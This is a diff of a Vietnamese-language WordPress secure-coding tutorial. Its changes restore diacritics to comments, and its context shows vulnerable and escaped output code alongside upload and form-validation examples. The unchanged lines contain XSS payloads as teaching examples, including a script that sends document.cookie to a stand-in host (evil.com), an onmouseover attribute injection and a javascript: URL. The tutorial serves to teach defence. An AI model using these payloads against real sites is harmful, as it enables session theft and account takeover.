@@ -197,7 +197,7 @@ $user_name = '<script>alert("XSS")</script>';
 echo $user_name;
 // Output: <script>alert("XSS")</script> => Browser thực thi script!
 
-// DUNG
+// ĐÚNG
 echo esc_html( $user_name );
 // Output: &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
 // Browser hiển thị text, KHÔNG thực thi script
@@ -216,7 +216,7 @@ echo '<input value="' . $value . '">';
 // Output: <input value="" onmouseover="alert(1)" data-x="">
 // => Thêm event handler độc hại!
 
-// DUNG
+// ĐÚNG
 echo '<input value="' . esc_attr( $value ) . '">';
 // Output: <input value="&quot; onmouseover=&quot;alert(1)&quot; data-x=&quot;">
 // => An toàn, hiển thị như text
@@ -237,7 +237,7 @@ $url = 'javascript:alert("XSS")';
 echo '<a href="' . $url . '">Click</a>';
 // => Click sẽ thực thi JavaScript!
 
-// DUNG
+// ĐÚNG
 echo '<a href="' . esc_url( $url ) . '">Click</a>';
 // Output: <a href="">Click</a>
 // => URL bị xóa vì protocol nguy hiểm
@@ -690,7 +690,7 @@ echo '<h1>Chào mừng, ' . $user->display_name . '</h1>';
 // Nếu display_name = "<script>document.location='http://evil.com?cookie='+document.cookie</script>"
 // => Cookie bị đánh cắp!
 
-// DUNG
+// ĐÚNG
 echo '<h1>Chào mừng, ' . esc_html( $user->display_name ) . '</h1>';
 
 // ============================================
@@ -701,7 +701,7 @@ echo '<h1>Chào mừng, ' . esc_html( $user->display_name ) . '</h1>';
 echo '<p>Kết quả tìm kiếm: ' . $_GET['s'] . '</p>';
 // URL: ?s=<script>alert('XSS')</script>
 
-// DUNG
+// ĐÚNG
 echo '<p>Kết quả tìm kiếm: ' . esc_html( sanitize_text_field( $_GET['s'] ) ) . '</p>';
 
 // ============================================
@@ -872,28 +872,28 @@ function handle_secure_upload() {
     // - Tạo tên file duy nhất (tránh trùng)
     // - Trả về URL và đường dẫn
 
-    // Phai include file nay truoc khi dung wp_handle_upload
+    // Phải include file này trước khi dùng wp_handle_upload
     if ( ! function_exists( 'wp_handle_upload' ) ) {
         require_once ABSPATH . 'wp-admin/includes/file.php';
     }
 
     $upload_overrides = array(
-        'test_form' => false,  // Khong kiem tra form (vi ta xu ly thu cong)
-        'mimes'     => $allowed_types,  // Chi cho phep MIME types nay
+        'test_form' => false,  // Không kiểm tra form (vì ta xử lý thủ công)
+        'mimes'     => $allowed_types,  // Chỉ cho phép MIME types này
     );
 
     $result = wp_handle_upload( $file, $upload_overrides );
 
     if ( isset( $result['error'] ) ) {
-        wp_die( 'Loi upload: ' . esc_html( $result['error'] ) );
+        wp_die( 'Lỗi upload: ' . esc_html( $result['error'] ) );
     }
 
-    // Thanh cong!
+    // Thành công!
     // $result['file'] = /var/www/html/wp-content/uploads/2024/01/filename.jpg
     // $result['url']  = https://example.com/wp-content/uploads/2024/01/filename.jpg
     // $result['type'] = image/jpeg
 
-    // 9. Tuy chon: Them vao Media Library
+    // 9. Tùy chọn: Thêm vào Media Library
     $attachment_id = wp_insert_attachment(
         array(
             'guid'           => $result['url'],
@@ -905,7 +905,7 @@ function handle_secure_upload() {
         $result['file']
     );
 
-    // Tao metadata cho attachment (thumbnail, sizes)
+    // Tạo metadata cho attachment (thumbnail, sizes)
     if ( ! function_exists( 'wp_generate_attachment_metadata' ) ) {
         require_once ABSPATH . 'wp-admin/includes/image.php';
     }
@@ -934,51 +934,51 @@ function render_upload_form() {
 ```php
 <?php
 /**
- * VALIDATION = Kiem tra du lieu co hop le khong.
- * Khac voi Sanitize (lam sach), Validate kiem tra logic.
+ * VALIDATION = Kiểm tra dữ liệu có hợp lệ không.
+ * Khác với Sanitize (làm sạch), Validate kiểm tra logic.
  *
- * Sanitize: Loai bo ky tu xau => "abc<script>" -> "abc"
- * Validate: Kiem tra dung dinh dang => "abc@" -> FALSE (khong phai email)
+ * Sanitize: Loại bỏ ký tự xấu => "abc<script>" -> "abc"
+ * Validate: Kiểm tra đúng định dạng => "abc@" -> FALSE (không phải email)
  */
 
 function validate_contact_form( array $data ): array {
     $errors = array();
 
-    // === REQUIRED (bat buoc) ===
+    // === REQUIRED (bắt buộc) ===
     if ( empty( $data['name'] ) ) {
-        $errors['name'] = 'Ten la bat buoc.';
+        $errors['name'] = 'Tên là bắt buộc.';
     }
 
-    // === LENGTH (do dai) ===
+    // === LENGTH (độ dài) ===
     if ( strlen( $data['name'] ) > 100 ) {
-        $errors['name'] = 'Ten khong duoc qua 100 ky tu.';
+        $errors['name'] = 'Tên không được quá 100 ký tự.';
     }
 
     if ( strlen( $data['name'] ) < 2 ) {
-        $errors['name'] = 'Ten phai co it nhat 2 ky tu.';
+        $errors['name'] = 'Tên phải có ít nhất 2 ký tự.';
     }
 
     // === EMAIL ===
     if ( empty( $data['email'] ) ) {
-        $errors['email'] = 'Email la bat buoc.';
+        $errors['email'] = 'Email là bắt buộc.';
     } elseif ( ! is_email( $data['email'] ) ) {
-        // is_email() la ham WordPress kiem tra email hop le
-        $errors['email'] = 'Email khong hop le.';
+        // is_email() là hàm WordPress kiểm tra email hợp lệ
+        $errors['email'] = 'Email không hợp lệ.';
     }
 
     // === URL ===
     if ( ! empty( $data['website'] ) ) {
-        // wp_http_validate_url kiem tra URL co the truy cap
+        // wp_http_validate_url kiểm tra URL có thể truy cập
         if ( ! filter_var( $data['website'], FILTER_VALIDATE_URL ) ) {
-            $errors['website'] = 'URL khong hop le.';
+            $errors['website'] = 'URL không hợp lệ.';
         }
     }
 
-    // === SO (Range) ===
+    // === SỐ (Range) ===
     if ( ! empty( $data['age'] ) ) {
         $age = intval( $data['age'] );
         if ( $age < 1 || $age > 150 ) {
-            $errors['age'] = 'Tuoi phai tu 1 den 150.';
+            $errors['age'] = 'Tuổi phải từ 1 đến 150.';
         }
     }
 
